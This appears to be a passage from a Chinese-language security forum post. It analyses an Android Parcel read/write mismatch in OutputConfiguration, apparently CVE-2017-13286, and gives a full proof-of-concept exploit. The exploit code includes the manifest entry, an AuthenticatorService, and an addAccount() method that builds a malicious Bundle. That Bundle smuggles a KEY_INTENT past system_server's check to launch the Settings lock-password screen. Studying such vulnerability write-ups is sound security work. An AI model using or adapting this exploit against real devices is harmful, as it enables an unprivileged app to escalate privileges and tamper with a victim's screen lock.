
```
public void writeToParcel(Parcel dest, int flags) {
    if (dest == null) {
        throw new IllegalArgumentException("dest must not be null");
    }
    dest.writeInt(mRotation);
    dest.writeInt(mSurfaceGroupId);
    dest.writeInt(mSurfaceType);
    dest.writeInt(mConfiguredSize.getWidth());
    dest.writeInt(mConfiguredSize.getHeight());
    dest.writeInt(mIsDeferredConfig ? 1 : 0);
    dest.writeInt(mIsShared ? 1 : 0);
    dest.writeTypedList(mSurfaces);
}

private OutputConfiguration(@NonNull Parcel source) {
    int rotation = source.readInt();
    int surfaceSetId = source.readInt();
    int surfaceType = source.readInt();
    int width = source.readInt();
    int height = source.readInt();
    boolean isDeferred = source.readInt() == 1;
    // missing write mIsShared
    ArrayList<Surface> surfaces = new ArrayList<Surface>();
    source.readTypedList(surfaces, Surface.CREATOR);

    checkArgumentInRange(rotation, ROTATION_0, ROTATION_270, "Rotation constant");
    ...
    ...
    ...
}
```

- 可以看到，`writeToParcel()` 中写入了一个 32 位的 `mIsShared`，但是在 `createFromParcel()` 中少读了一个 32 位的 `mIsShared`。导致在读写内存时错位。

- 因此，我们可以在序列化的 `Bundle` 中构造如下数据：

  ![](https://bbs.kanxue.com/upload/attach/202107/883702_ARPHK6472R2DE6Q.png)

- 在 Authenticator App 中构造恶意 `Bundle`。在 `system_server` 发生的第一次反序列化时，识别到第一个对象为 `OutputConfiguration`，调用它的 `readToParcel()` 将数据读入。由于它的 `readToParcel()` 不会读入 `mIsShared`，因此把我们构造的 `0` 作为 `ArrayList` 的长度读入了，确认到 `ArrayList` 的长度为 0，也就结束了第一个键值对的读入。读取第二个键值对时，识别到值的类型为 `ByteArray`（13），因此会把我们的恶意 `Intent` 作为 `ByteArray` 的数据读入，而不会进行检查。

- 然后，第二次序列化时 `system_server` 通过 `writeInt()` 将 `mIsShared` 写入 `Bundle`，多出了一个 32 位的 `0`，后续内容不变。

- 最后，`Settings` 反序列化读入 `Bundle`，由于仍然不读入 `mIsShared`，因此刚刚写入的 `mIsShared` 会被读到 `ArrayList` 的长度中，识别到 `ArrayList` 的长度为 0，就认为读 `OutputConfiguration` 完毕。接下来开始读第二个键值对，把 `0` 连同紧接着的 `1`，认为是第二个键值对的键为 `null`，然后 `6` 作为值的类型被读入，认为是 `long`，于是后面把 `13` 和接下来 `ByteArray` length 的 8 字节作为第二个键值对的值，就结束了对 `long` 的读取。最终，恶意 `KEY_INTENT` 显现出来作为第三个键值对！

## 3. POC

### 在 `AndroidManifest.xml` 文件中设置

```
<service
    android:name=".AuthenticatorService"
    android:exported="true"
    android:enabled="true">
    <intent-filter>
        <action android:name="android.accounts.AccountAuthenticator" />
    </intent-filter>
    <meta-data android:name="android.accounts.AccountAuthenticator"
        android:resource="@xml/authenticator" />
</service>
```

### 实现 `AuthenticatorService`

```
public class AuthenticatorService extends Service {
    public AuthenticatorService() {
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        MyAuthenticator authenticator = new MyAuthenticator(this);
        return authenticator.getIBinder();
    }
}
```

### 实现 `MyAuthenticator`，在 `addAccount()` 方法中构建恶意 `Bundle`

```
public class MyAuthenticator extends AbstractAccountAuthenticator {

    private Context m_context = null;

    public MyAuthenticator(Context context) {
        super(context);
        m_context = context;
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options) throws NetworkErrorException {

        Bundle evilBundle = new Bundle();
        Parcel bndlData = Parcel.obtain();
        Parcel pcelData = Parcel.obtain();

        pcelData.writeInt(3); // number of elements in ArrayMap
        /*****************************************************/
        // mismatched object
        pcelData.writeString("mismatch");
        pcelData.writeInt(4); // VAL_PARCELABLE
        pcelData.writeString("android.hardware.camera2.params.OutputConfiguration"); // name of Class Loader
        pcelData.writeInt(1); // mRotation
        pcelData.writeInt(1); // mSurfaceGroupId
        pcelData.writeInt(1); // mSurfaceType
        pcelData.writeInt(1); // mConfiguredSize.getWidth()
        pcelData.writeInt(1); // mConfiguredSize.getHeight()
        pcelData.writeInt(1); // mIsDeferredConfig
        pcelData.writeInt(0); // mIsShared
        pcelData.writeInt(1); // ListLen

        pcelData.writeInt(6);
        pcelData.writeInt(13);

        pcelData.writeInt(-1); // hold the length of Evil object
        int keyIntentStartPos = pcelData.dataPosition(); // hold the start position of Evil object
        // Evil object hide in ByteArray
        pcelData.writeString(AccountManager.KEY_INTENT);
        pcelData.writeInt(4);
        pcelData.writeString("android.content.Intent"); // name of Class Loader
        pcelData.writeString(Intent.ACTION_RUN); // Intent Action
        Uri.writeToParcel(pcelData, null); // Uri is null
        pcelData.writeString(null); // mType is null
        pcelData.writeInt(0x10000000); // Flags
        pcelData.writeString(null); // mPackage is null
        pcelData.writeString("com.android.settings");
        pcelData.writeString("com.android.settings.password.ChooseLockPassword");
        pcelData.writeInt(0); // mSourceBounds = null
        pcelData.writeInt(0); // mCategories = null
        pcelData.writeInt(0); // mSelector = null
        pcelData.writeInt(0); // mClipData = null
        pcelData.writeInt(-2); // mContentUserHint
        pcelData.writeBundle(null);

        int keyIntentEndPos = pcelData.dataPosition(); // hold the end position of Evil object
        int lengthOfKeyIntent = keyIntentEndPos - keyIntentStartPos;
        pcelData.setDataPosition(keyIntentStartPos - 4); // backpatch length of KEY_INTENT
        pcelData.writeInt(lengthOfKeyIntent);
        pcelData.setDataPosition(keyIntentEndPos);

        ///////////////////////////////////////////
        pcelData.writeString("Padding-Key");
        pcelData.writeInt(0); // VAL_STRING
        pcelData.writeString("Padding-Value"); //

        int length = pcelData.dataSize();
        bndlData.writeInt(length);
        bndlData.writeInt(0x4c444E42);
        bndlData.appendFrom(pcelData, 0, length);
        bndlData.setDataPosition(0);
        evilBundle.readFromParcel(bndlData);
        return evilBundle;
    }
    ......
    ......
}
```

[\[招生\]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于 2023-11-29 10:56 被 kanxue 编辑，原因：[#漏洞相关](https://bbs.kanxue.com/forum-161-1-123.htm)

上传的附件：

- [Poc201713286.zip](javascript:void(0);) （8.64MB，80次下载）
- [复现视频.mp4](javascript:void(0);) （1.62MB，86次下载）
